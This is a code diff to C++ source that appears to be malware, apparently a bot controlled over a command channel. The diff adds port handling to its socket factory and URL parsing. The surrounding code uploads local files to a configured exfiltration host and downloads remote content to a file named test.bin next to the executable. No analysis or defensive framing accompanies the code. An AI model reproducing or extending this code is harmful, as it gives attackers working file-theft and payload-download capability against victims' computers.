@@ -15,12 +15,12 @@ using namespace Legit;
 using json = nlohmann::json;
 using namespace std;
 
-unique_ptr<ISocket> SocketFactory(string scheme, string host)
+unique_ptr<ISocket> SocketFactory(string scheme, string host, string port)
 {
     if (scheme == "http://")
-        return make_unique<Socket>(host, "80");
+        return make_unique<Socket>(host, port == "" ? "80" : port);
     else if (scheme == "https://")
-        return make_unique<SecureSocket>(host, "443", make_unique<CertStore>());
+        return make_unique<SecureSocket>(host, port == "" ? "443" : port, make_unique<CertStore>());
     else
         return nullptr;
 }
@@ -45,7 +45,8 @@ void MainThread(unsigned int parentThreadId)
     auto exfilUrlParts = HttpUtils::SplitUrl(exfil);
     string exfilScheme = exfilUrlParts[0];
     string exfilHost = exfilUrlParts[1];
-    string exfilPath = exfilUrlParts[2];
+    string exfilPort = exfilUrlParts[2];
+    string exfilPath = exfilUrlParts[3];
 
     cout << "Done" << endl;
 
@@ -100,7 +101,7 @@ void MainThread(unsigned int parentThreadId)
                 files.insert(make_pair("f0", HttpFile(filenameParts.back(), fileContents)));
 
                 auto body = HttpUtils::CreateBody(fields, files, boundary);
-                HttpClient client(SocketFactory(exfilScheme, exfilHost));
+                HttpClient client(SocketFactory(exfilScheme, exfilHost, exfilPort));
                 auto response = client.Post(exfilPath + "?c=" + nick, body, "multipart/form-data; boundary=" + boundary);
 
                 cc->Send("Done (" + response.statusCode + ")");
@@ -114,9 +115,9 @@ void MainThread(unsigned int parentThreadId)
         {
             string url = message.substr(9);
             auto urlParts = HttpUtils::SplitUrl(url);
-            HttpClient client(SocketFactory(urlParts[0], urlParts[1]));
+            HttpClient client(SocketFactory(urlParts[0], urlParts[1], urlParts[2]));
 
-            auto response = client.Get(urlParts[2]);
+            auto response = client.Get(urlParts[3]);
             
             string path = Processes::GetExecutablePath() + Legit::SEPARATOR + "test.bin";
             DataLoader::DumpToFile(Utils::WideFromString(path), response.body);
